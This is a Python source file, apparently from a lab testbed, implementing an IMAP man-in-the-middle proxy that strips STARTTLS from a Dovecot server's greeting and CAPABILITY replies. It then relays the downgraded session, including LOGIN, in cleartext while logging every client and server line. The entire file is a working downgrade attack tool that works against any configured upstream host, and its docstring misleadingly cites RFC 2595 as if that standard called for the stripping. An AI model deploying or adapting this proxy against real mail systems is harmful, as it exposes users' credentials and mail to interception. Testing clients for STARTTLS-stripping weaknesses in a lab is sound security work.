#!/usr/bin/env python3
"""
testbed/mitm/imap_proxy.py
==========================
Lightweight, protocol-aware IMAP MITM Proxy for STARTTLS Stripping.

Architecture:
-------------
Transparent application-layer IMAP proxy sitting on the real traffic path between
the IMAP client and Dovecot IMAP server:

    IMAP Client (172.28.0.1 / 172.28.0.20)
               ↓
    IMAP MITM Proxy (172.28.0.30:143)
               ↓
    Dovecot Server (172.28.0.11:143)

Behaviors:
  - Accepts client connections on listen_port (default: port 143).
  - Establishes connection to upstream Dovecot server on upstream_port (default: port 143).
  - Relays initial * OK greeting banner from server to client, stripping STARTTLS if advertised in greeting.
  - Intercepts client CAPABILITY command.
  - Strips STARTTLS capability token from * CAPABILITY response per RFC 2595 §5.
  - Relays stripped capability response to the client.
  - Continues relaying subsequent IMAP dialogue (e.g. LOGOUT, LOGIN).
  - Cleanly shuts down on connection termination.

RFC Standards:
  - RFC 3501: INTERNET MESSAGE ACCESS PROTOCOL - VERSION 4rev1
  - RFC 2595: Using TLS with IMAP, POP3 and ACAP (STARTTLS command)
"""

import argparse
import logging
import re
import socket
import sys
import threading
from typing import List, Tuple

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [imap_mitm] %(message)s",
)
logger = logging.getLogger("imap_proxy")


def read_imap_line(sock: socket.socket) -> str:
    """Read a single CRLF-terminated line from an IMAP socket."""
    buffer = bytearray()
    while True:
        chunk = sock.recv(1)
        if not chunk:
            if buffer:
                break
            raise ConnectionResetError("Connection closed unexpectedly while reading IMAP line")
        buffer.extend(chunk)
        if buffer.endswith(b"\r\n") or buffer.endswith(b"\n"):
            break
    return buffer.decode("latin-1")


def strip_starttls_from_imap_line(line: str) -> str:
    """
    Remove STARTTLS token from IMAP capability lines or greeting brackets per RFC 2595 §5.
    """
    clean = line.strip()
    if "STARTTLS" not in clean.upper():
        return line

    # Case 1: Untagged * CAPABILITY line
    if clean.upper().startswith("* CAPABILITY"):
        tokens = clean.split()
        filtered = [t for t in tokens if t.upper() != "STARTTLS"]
        logger.info("Stripped STARTTLS from IMAP capability line: %r -> %r", clean, " ".join(filtered))
        return " ".join(filtered) + "\r\n"

    # Case 2: Greeting with [CAPABILITY ...]
    if "[CAPABILITY " in clean.upper():
        def _replace_cap(m):
            caps = m.group(1).split()
            filtered = [c for c in caps if c.upper() != "STARTTLS"]
            return f"[CAPABILITY {' '.join(filtered)}]"
        new_line = re.sub(r"\[CAPABILITY ([^\]]+)\]", _replace_cap, line, flags=re.IGNORECASE)
        logger.info("Stripped STARTTLS from IMAP greeting bracket: %r -> %r", line.strip(), new_line.strip())
        return new_line

    return line


def handle_client(
    client_sock: socket.socket,
    client_addr: Tuple[str, int],
    upstream_host: str,
    upstream_port: int,
    strip_mode: bool = True,
) -> None:
    """Handle a single proxied IMAP session."""
    logger.info("IMAP Client connected from %s:%d", client_addr[0], client_addr[1])
    server_sock: socket.socket | None = None

    try:
        server_sock = socket.create_connection((upstream_host, upstream_port), timeout=10.0)
        logger.info("Connected to upstream Dovecot IMAP server at %s:%d", upstream_host, upstream_port)

        # 1. Relay initial greeting from Dovecot to Client
        greeting = read_imap_line(server_sock)
        logger.info("Server greeting (raw): %r", greeting.strip())
        if strip_mode:
            greeting = strip_starttls_from_imap_line(greeting)
        client_sock.sendall(greeting.encode("latin-1"))

        # 2. Main command/response relay loop
        while True:
            try:
                cmd_line = read_imap_line(client_sock)
            except (ConnectionResetError, EOFError):
                logger.info("Client closed connection")
                break

            if not cmd_line:
                break

            logger.info("Client -> Server: %r", cmd_line.strip())
            parts = cmd_line.strip().split()
            cmd_tag = parts[0] if parts else ""
            cmd_verb = parts[1].upper() if len(parts) > 1 else ""

            # Relay command to upstream Dovecot server
            server_sock.sendall(cmd_line.encode("latin-1"))

            # Read server responses until tagged completion line
            is_logout = (cmd_verb == "LOGOUT")
            while True:
                resp_line = read_imap_line(server_sock)
                logger.info("Server -> Client line: %r", resp_line.strip())

                if strip_mode:
                    resp_to_send = strip_starttls_from_imap_line(resp_line)
                else:
                    resp_to_send = resp_line

                client_sock.sendall(resp_to_send.encode("latin-1"))

                # Check if this line is the tagged response matching cmd_tag
                clean_resp = resp_line.strip()
                if cmd_tag and clean_resp.startswith(cmd_tag + " "):
                    break
                elif not cmd_tag and (clean_resp.startswith("* OK") or clean_resp.startswith("* BAD") or clean_resp.startswith("* NO")):
                    break

            if is_logout:
                logger.info("LOGOUT observed, closing session")
                break

    except Exception as exc:
        logger.error("IMAP Proxy error during session: %s", exc)
    finally:
        if server_sock:
            try:
                server_sock.close()
            except Exception:
                pass
        try:
            client_sock.close()
        except Exception:
            pass
        logger.info("IMAP Session with %s:%d closed", client_addr[0], client_addr[1])


def run_proxy(
    listen_host: str = "0.0.0.0",
    listen_port: int = 143,
    upstream_host: str = "172.28.0.11",
    upstream_port: int = 143,
    strip_mode: bool = True,
    single_session: bool = False,
) -> None:
    """Run the IMAP proxy listener loop."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((listen_host, listen_port))
    listener.listen(5)
    logger.info("IMAP MITM Proxy listening on %s:%d -> forwarding to %s:%d (strip_starttls=%s)",
                listen_host, listen_port, upstream_host, upstream_port, strip_mode)

    try:
        while True:
            client_sock, client_addr = listener.accept()
            if single_session:
                handle_client(client_sock, client_addr, upstream_host, upstream_port, strip_mode)
                break
            else:
                t = threading.Thread(
                    target=handle_client,
                    args=(client_sock, client_addr, upstream_host, upstream_port, strip_mode),
                    daemon=True,
                )
                t.start()
    except KeyboardInterrupt:
        logger.info("IMAP Proxy interrupted by keyboard")
    finally:
        listener.close()
        logger.info("IMAP Proxy listener stopped")


def main() -> None:
    parser = argparse.ArgumentParser(description="IMAP STARTTLS Stripping MITM Proxy")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Address to listen on")
    parser.add_argument("--listen-port", type=int, default=143, help="Port to listen on")
    parser.add_argument("--upstream-host", default="172.28.0.11", help="Upstream Dovecot server host")
    parser.add_argument("--upstream-port", type=int, default=143, help="Upstream Dovecot server port")
    parser.add_argument("--no-strip", action="store_true", help="Disable STARTTLS stripping (pass-through mode)")
    parser.add_argument("--single-session", action="store_true", help="Exit after serving a single session")
    args = parser.parse_args()

    run_proxy(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        upstream_host=args.upstream_host,
        upstream_port=args.upstream_port,
        strip_mode=not args.no_strip,
        single_session=args.single_session,
    )


if __name__ == "__main__":
    main()
